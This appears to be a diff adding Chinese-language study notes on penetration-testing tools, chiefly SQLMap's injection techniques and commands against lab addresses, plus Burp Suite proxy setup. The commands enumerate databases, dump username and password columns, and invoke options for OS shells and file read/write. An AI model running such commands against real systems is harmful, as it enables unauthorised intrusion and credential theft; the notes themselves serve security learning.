@@ -133,13 +133,40 @@
         - 需要配置伪静态文件（.htaccess），在平台根目录下创建.htaccess文件
         - 使用注册的账号登录XSS平台，创建项目
 
-
-
-
-
-
-
-
+3、常用的渗透测试工具
+- SQLMap
+    - 一个自动化的SQL注入工具，主要功能是扫描、发现并利用给定URL的SQL注入漏洞，支持MySQL、Oracle、PostgreSQL、SQL Server、
+Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB.SQLMap采用了以下的SQL注入技术：
+        - 基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入
+        - 基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断
+        - 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中
+        - 联合查询注入，在可以使用Union的情况下的注入
+        - 堆查询注入，可以同时执行多条语句时的注入
+    - 安装SQLMap，需要Python2环境
+    - 使用
+        - 1）判断是否存在注入。假设目标注入点是http://192.168.1.104/sql1/Less-1/?id=11，
+        命令sqlmap.py -u http://192.168.1.104/sql1/Less-1/?id=1，多个参数需要加双引号
+        - 2）判断文本中的请求是否存在注入，sqlmap.py -r desktop/1.txt，r一般在存在cookie注入时使用
+        - 3）查询当前用户下的所有数据库，sqlmap.py -u http://192.168.1.104/sql/Less-1?id=1 [--dbs|-D xxx]，在xxx数据库中查询
+        - 4）获取数据库中的表名，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" -D dkeye [--tables|-T]
+        - 5）获取表中的字段名，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" -D dkeye -T user_info --columns
+        - 6）获取字段内容，sqlmap.py -u "http://192.168.1.7/sql/unoin.php?id=1" -D dkeye -T user_info -C username,password --dump
+        - 7）获取数据库的所有用户，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" --users，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" --passwords
+        - 8）获取当前网站数据库的名称，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" --current-db
+        - 9）获取当前网站数据库的用户名称，sqlmap.py -u "http://192.168.1.7/sql/union.php?id=1" --current-user
+        - 参数
+            - --level 5：探测等级，1~5等级
+            - --is-dba：当前用户是否为管理权限，单会布尔值
+            - --roles：列出数据库管理员角色
+            - --referer：HTTP Referer头
+            - --sql-shell：运行自定义SQL语句
+            - --os-cmd，--os-shell：运行任意操作系统命令
+            - --file-read：从数据库服务器中读物文件
+            - --file-write，--file-dest：上传文件到数据库服务器中
+- Burp Suite
+    - 用Java开发的，运行时依赖JRE，下载后无需安装，直接双击BurpLoader.jar
+    - Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，拦截HTTP和HTTPS协议的流量
+    - 设置：Burp Proxy默认本地代理端口为8080，Firefox浏览器设置HTTP代理为127.0.0.1，端口为8080
 
 
 
